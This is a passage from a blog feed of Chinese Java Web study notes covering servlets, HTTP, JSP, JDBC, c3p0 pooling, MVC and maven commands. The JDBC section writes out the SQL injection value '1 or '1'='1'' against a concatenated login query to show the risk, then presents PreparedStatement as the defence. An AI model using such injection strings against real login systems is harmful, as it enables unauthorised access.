class="line">http://learn.chaoxing.com</span><br></pre></td></tr></table></figure><hr><p>参考:<br><a href="https://blog.csdn.net/aspirationflow/article/details/7694274">https://blog.csdn.net/aspirationflow/article/details/7694274</a><br>其他工具信息:<br><a href="https://sectools.org/">https://sectools.org/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java Web</title>
      <link href="/2019/04/18/java-web/"/>
      <url>/2019/04/18/java-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h2 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h2><ul><li>生命周期<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/q0o0p&quot;)</span>   <span class="comment">//注解配置</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyServlet</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;创建了servlet对象&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 初始化方法</span></span><br><span class="line"><span class="comment">* 在servlet被创建时执行，只会执行一次</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init。。。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 提供 服务方法</span></span><br><span class="line"><span class="comment">* 每次servlet 被访问时执行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;已经接受servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 销毁方法</span></span><br><span class="line"><span class="comment">* 在服务器正常关闭时执行，并销毁</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroys&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>注解配置<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/q0o0p&quot;)</span>  <span class="comment">//单个路径访问</span></span><br><span class="line"><span class="meta">@WebServlet(&#123;&quot;/q0o0p/*&quot;,&quot;/qp&quot;,&quot;/0o0&quot;&#125;)</span>  <span class="comment">//多个路径访问</span></span><br></pre></td></tr></table></figure></li></ul><p><em>路径规则</em><br>/* 通配符（全部）<br>*.do</p><ul><li>体系结构<br>servlet  接口<br>   |<br>GenericServlet   抽象类<br>   |<br>HttpServet （对http协议的一种封装）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.q0o0p.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/re&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doGet...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;doPost...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/re&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span>  <span class="comment">&lt;!--定义为post--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a><br>http协议有7中请求方式</p><pre><code>GET： 1.请求参数在请求行中，在url后2.请求的url长度是有限制的3.不太安全POST： 1.请求参数在在请求体中2.请求的url长度没有限制3. 相对安全</code></pre><p>请求消息数据格式：<br>1、请求行<br>    请求方式  请求url  请求协议/版本<br>    GET      login.html   HTTP/1.1</p><p>2、请求头（键值对的形式）<br>    User-Agent: 浏览器告诉服务器,访问的浏览器的版本信息<br>    解决浏览器版本兼容性问题</p><p>postman测试：<br><img src="https://q0o0p.top/2019/04/18/2.png"></p><pre><code>Referer: http://.....防盗链，统计工作请求头名称： 请求值</code></pre><p> <em>字符串格式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host: cdn.jsdelivr.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: https://q0o0p.top/2020/04/06/encryption-algorithm/</span><br></pre></td></tr></table></figure><p>3、请求空行<br>    空行（分隔请求头和请求体）<br>4、请求体<br>    正文<br>    封装POST请求消息的请求参数</p><h4 id="HTTP-响应代码"><a href="#HTTP-响应代码" class="headerlink" title="HTTP 响应代码"></a>HTTP 响应代码</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status</a></p><hr><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><p>本质上是servlet，主要负责与用户界面交互，将最终的网页呈现给用户<br>HTML+JS+CSS+java 混合文件</p><p>JSP引擎处理.jsp文件，将它编译成一个servlet文件<br>简单来说就是在HTML中嵌入java代码</p><ul><li>1、JSP 脚本:执行java逻辑代码<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  java代码 %&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String str= &quot;hhh~&quot;;</span><br><span class="line">    System.out.println(str);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li><li>2、JSP声明：定义java方法<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! 声明java方法 %&gt;</span><br></pre></td></tr></table></figure>只能声明，不能调用方法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    public String test()&#123;</span><br><span class="line">        return&quot;q0o0p&quot;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li><li>3、JSP表达式： 把java对象直接输出到html页面中<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h3><ul><li>request： 一次请求 ，HttpServletResquest<br>  常用方法：<br>  1、String getParameter(String key) 获取客户端传来的参数<br>  浏览器—&gt;服务端<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%String id = request.getParameter(&quot;id&quot;);%&gt;</span><br><span class="line">&lt;%= id%&gt;</span><br></pre></td></tr></table></figure><img src="https://q0o0p.top/2019/04/18/3.png"><br>  2、void setAttrbute(String key,Object value) 通过键值对形式进行保存数据<br>  服务端内部传递</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将数据传入到request中</span></span><br><span class="line">    request.setAttribute(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">    <span class="comment">//将请求转发到test            目的地                   方法</span></span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;test.jsp&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure><pre><code>3、Object getAttribute(String key) 通过key值取出</code></pre><p>response: 一次响应，HTTPServletResponse<br>PageContext： 页面上下文，获取页面信息，PageContext<br>session： 表示一次会话（保存用户信息），HTTPSession<br>application表示当前web应用，全局对象<br>config：当前JSP对应的ServletConfig对象，获取当前Servlet信息<br>out： 向浏览器输出数据，JSPWriter<br>Page： 当前JSP对应个servlet对象，Servlet<br>exception： 表示JSP页面发生的异常，Exception</p><p>Integer id = Integer.parseInt(idStr)</p><hr><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>JDBC API 提供者java官方<br>内容：提供开发者调用的接口<br>java.sql和javax.sql</p><ul><li>DriverManger 类<br>  java官方提供 ，管理不同的JDBC驱动<br>  JDBC 驱动：数据库产商提供 ，连接不同的数据库</li><li>Connection 接口</li><li>Statement 接口</li><li>ResultSet 接口</li></ul><h3 id="JDBC的使用"><a href="#JDBC的使用" class="headerlink" title="JDBC的使用"></a>JDBC的使用</h3><p>1、加载数据库驱动，java程序和数据库之间的桥梁</p><p>2、获取Connnection，java程序与数据库的一次连接</p><p>3、创建Statement 对象，由Connection产生，执行SQL语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">&quot;jdbc:mysql://localhost:3306/q0o0p?useSSL=false&amp;serverTimezone=UTC&quot;</span>; <span class="comment">//mysql8.0.x&quot;jdbc:mysql://localhost:3306/q0o0p?useUnicode=true&amp;characterEncoding=UTF-8&quot;;</span></span><br><span class="line">            String user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            String password = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            Connection connection= DriverManager.getConnection(url,user,password);</span><br><span class="line">            System.out.println(connection);<span class="comment">//检测是否连接成功</span></span><br><span class="line"><span class="comment">//添加数据</span></span><br><span class="line">String sql = <span class="string">&quot;insert into findpwd values(1,131,&#x27;2944518598@qq.com&#x27;,&#x27;126800&#x27;)&quot;</span>;</span><br><span class="line">Statement statement = connection.createStatement();</span><br></pre></td></tr></table></figure><p>4、如果需要收返回值，创建ResultSet对象，保存Statement执行之后查询到的结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//增删改</span></span><br><span class="line">statement.executeUpdate(sql);</span><br><span class="line"><span class="comment">//查询</span></span><br><span class="line">statement.executeQuery(sql);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">&quot;select * from findpwd&quot;</span>;</span><br><span class="line">Statement statement1 = connection.createStatement(); </span><br><span class="line">ResultSet resultSet = statement1.executeQuery(sql);</span><br><span class="line">    <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">                <span class="keyword">int</span> id = resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                String phone = resultSet.getString(<span class="number">2</span>);</span><br><span class="line">                String email = resultSet.getString(<span class="number">3</span>);</span><br><span class="line">                String userpwd = resultSet.getString(<span class="number">4</span>);</span><br><span class="line">                System.out.println(id+<span class="string">&quot; &quot;</span>+phone+<span class="string">&quot; &quot;</span>+email+<span class="string">&quot; &quot;</span>+userpwd);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>使用Statement的缺点：</p><ul><li>需要频繁使用拼接String 出错率高</li><li>存在SQL注入风险<br>SQL注入：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String username = <span class="string">&quot;1 or &#x27;1&#x27;=&#x27;1&#x27;&quot;</span>;  <span class="comment">//SQL注入</span></span><br><span class="line">           String pwd = <span class="string">&quot;126800&quot;</span>;</span><br><span class="line">           String sql = <span class="string">&quot;select * from login where user_phone=&quot;</span> + username + <span class="string">&quot; and user_password=&#x27;&quot;</span> + pwd + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">         System.out.println(sql);</span><br></pre></td></tr></table></figure><img src="https://q0o0p.top/2019/04/18/4.png"><h4 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h4>Statement 的子类，提供了SQL占位符的功能<br>先判断在拼接，防止SQL注入<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String sql1 = <span class="string">&quot;select * from login where user_phone=? and user_password= ?&quot;</span>;</span><br><span class="line">           System.out.println(sql1);</span><br><span class="line">           PreparedStatement preparedStatement = connection.prepareStatement(sql1);</span><br><span class="line">           preparedStatement.setString(<span class="number">1</span>,username);</span><br><span class="line">           preparedStatement.setString(<span class="number">2</span>,pwd);</span><br><span class="line">           ResultSet resultSet1 = preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">           System.out.println(sql1);</span><br><span class="line">           <span class="keyword">if</span>(resultSet.next())&#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p><a href="https://dev.mysql.com/downloads/windows/installer/8.0.html">https://dev.mysql.com/downloads/windows/installer/8.0.html</a><br><img src="https://q0o0p.top/2019/04/18/1.png"></p><p>JDBC下载：<br><a href="https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-8.0.19.zip">https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-8.0.19.zip</a><br>SQL server<br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=55539">https://www.microsoft.com/en-us/download/details.aspx?id=55539</a></p><p>使用：<br>1、导入驱动jar包<br>2、注册驱动<br>3、获取数据库连接对象 Connection<br>4、定义SQL<br>5、获取执行SQL语句对象 Statement<br>6、执行sql，接收返回结果<br>7、处理结果<br>8、释放资源</p><pre><code>https://mvnrepository.com/search?q=mysql-connect-java</code></pre><hr><h2 id="Sevlet-JSP-JDBC"><a href="#Sevlet-JSP-JDBC" class="headerlink" title="Sevlet+JSP+JDBC"></a>Sevlet+JSP+JDBC</h2><ul><li>1、创建lib目录（WEB-INF–&gt;lib）</li></ul><p>-jstl.jar <a href="http://repo2.maven.org/maven2/javax/servlet/jstl/">http://repo2.maven.org/maven2/javax/servlet/jstl/</a><br>standard.jar <a href="http://repo2.maven.org/maven2/taglibs/standard/">http://repo2.maven.org/maven2/taglibs/standard/</a></p><hr><h2 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h2><p>JDBC开发流程</p><ul><li>加载驱动</li><li>建立数据库连接（Connection）</li><li>执行SQL语句（Statement）</li><li>ResultSet接收数据结果（查询）</li><li>断开连接，释放资源、</li></ul><p>建立一个数据库缓冲池，预先缓冲池中放一定数量的连接对象，读取数据的时候就从缓冲池中取出一个对象，用完后放回到缓冲池中，重复利用</p><p>使用javax.sql.DataSource 接口实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//创建C3P0</span></span><br><span class="line">           ComboPooledDataSource dataSource = <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line">           dataSource.setDriverClass(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">           dataSource.setJdbcUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/q0o0p?useSSL=false&amp;serverTimezone=UTC&quot;</span>);</span><br><span class="line">           dataSource.setUser(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">           dataSource.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">           Connection connection = dataSource.getConnection();</span><br><span class="line">           System.out.println(connection);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (PropertyVetoException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mchange.v2.c3p0.impl.NewProxyConnection@5e25a92e</span><br></pre></td></tr></table></figure><p>传统方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mysql.cj.jdbc.ConnectionImpl@1efed156</span><br></pre></td></tr></table></figure><p>一个接口有两个不同的实现类——&gt;多态</p><p>实际开发，将c3p0的配置信息定义在xml文件中，xml文件秩序加载<br>修改java程序需要重新编译</p><ul><li>xml文件名固定：c3p0-config.xml</li><li>初始化CombopooledDataSource时，传入的参数必须是c3p0-config.xml 中nameed-config 标签的name</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;c3p0-config&gt;</span><br><span class="line">    &lt;named-config name=<span class="string">&quot;testc3p0&quot;</span>&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;user&quot;</span>&gt;root&lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;password&quot;</span>&gt;root&lt;/property&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;driverClass&quot;</span>&gt;com.mysql.cj.jdbc.Driver &lt;/property&gt;S</span><br><span class="line">        &lt;property name=<span class="string">&quot;jdbcUrl&quot;</span>&gt;jdbc:mysql:<span class="comment">//localhost:3306/q0o0p?useSSL=false&amp;amp;serverTimezone=UTC&amp;amp;allowPublicKeyRetrieval=true&lt;/property&gt;</span></span><br><span class="line"></span><br><span class="line">        &lt;!--当连接对象不够时，再次申请拦截对象个数--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;acquireIncrement&quot;</span>&gt;<span class="number">5</span>&lt;/property&gt;</span><br><span class="line">        &lt;!--设置初始化连接个数--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;initialPoolSize&quot;</span>&gt;<span class="number">20</span>&lt;/property&gt;</span><br><span class="line">        &lt;!--设置最小连接数--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;minPoolSize&quot;</span>&gt;<span class="number">2</span>&lt;/property&gt;</span><br><span class="line">        &lt;!--设置最大连接数--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;maxPoolSize&quot;</span>&gt;<span class="number">40</span>&lt;/property&gt;</span><br><span class="line">    &lt;/named-config&gt;</span><br><span class="line">&lt;/c3p0-config&gt;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mchange.v2.c3p0.impl.NewProxyConnection@1d548a08</span><br></pre></td></tr></table></figure><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>在.xml文件中连接为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;property name=<span class="string">&quot;driverClass&quot;</span>&gt;com.mysql.cj.jdbc.Driver &lt;/property&gt;S</span><br></pre></td></tr></table></figure><p>不然会报错：<br>[Fatal Error] :5:90: 对实体 “serverTimezone” 的引用必须以 ‘;’ 分隔符结尾。<br>十一月 01, 2019 5:33:32 下午 com.mchange.v2.c3p0.cfg.C3P0Config <br>警告: XML configuration disabled! Verify that standard XML libs are available.<br>org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 90; 对实体 “serverTimezone” 的引用必须以 ‘;’ 分隔符结尾。</p><hr><h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>一种开发模式，将程序分层<br>M: Modle 业务数据 （service、repository（数据库交互）、entity（数据映射成java对象））<br>V: view 视图（jsp 、html、App客户端）<br>C: Controller 控制（servlet、handle、action）<br>请求进入java Web应用后，Controller接收该请求，进行业务逻辑处理，最终将处理结果返回给用户（view +Model)<br>Controller–&gt;Service–&gt; Repository–&gt;DB<br> entity 实体类用来封装结一张表对应一个repository</p><hr><h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><p>下载地址；<br><a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a></p><p>src: 配置文件部分<br>    src/main/java : 核心代码部分<br>    src/main/resources :配置文件部分<br>    src/main/webapp :页面资源,js ,css, 图片<br>    src/test/java :测试代码部分<br>    src/test/resources :测试配置文件部分<br>config: 测试代码部分<br>resources:测试配置文件部分</p><p>pom.xml :项目信息,所依赖的jar包,运行环境信息(jdk,tomcat信息)</p><ul><li>GroupId：项目组织唯一的标识符，实际对应 JAVA 的包的结构，也就是 main 目录下 java 的目录结构（包）</li><li>AritifactId：项目的唯一标识符，实际对应项目的名称，就是项目根目录的名称</li></ul><hr><h3 id="mvn-命令"><a href="#mvn-命令" class="headerlink" title="mvn 命令"></a>mvn 命令</h3><ol><li><p>创建Maven的普通Java项目：<br>mvn archetype:create<br> -DgroupId=packageName<br> -DartifactId=projectName</p></li><li><p>创建Maven的Web项目：<br>mvn archetype:create<br> -DgroupId=packageName<br> -DartifactId=webappName<br> -DarchetypeArtifactId=maven-archetype-webapp</p></li><li><p>反向生成 maven 项目的骨架：<br>mvn archetype:generate</p></li><li><p>编译源代码：</p></li></ol><p>mvn compile<br>5. 编译测试代码：</p><p>mvn test-compile<br>6. 运行测试:</p><p>mvn test<br>7. 产生site：</p><p>mvn site<br>8. 打包：</p><p>mvn package<br>9. 在本地Repository中安装jar：</p><p>mvn install<br>例：installing D:\xxx\xx.jar to D:\xx\xxxx<br>10. 清除产生的项目：</p><p>mvn clean<br>11. 生成eclipse项目：</p><p>mvn eclipse:eclipse<br>12. 生成idea项目：</p><p>mvn idea:idea<br>13. 组合使用goal命令，如只打包不测试：</p><p>mvn -Dtest package<br>14. 编译测试的内容：</p><p>mvn test-compile<br>15. 只打jar包:</p><p>mvn jar:jar<br>16. 只测试而不编译，也不测试编译：</p><p>mvn test -skipping compile -skipping test-compile<br> ( -skipping 的灵活运用，当然也可以用于其他组合命令)<br>mvn archetype:generate</p><p>18.查看当前项目已被解析的依赖：</p><p>mvn dependency:list<br>19.上传到私服：</p><p>mvn deploy<br>20. 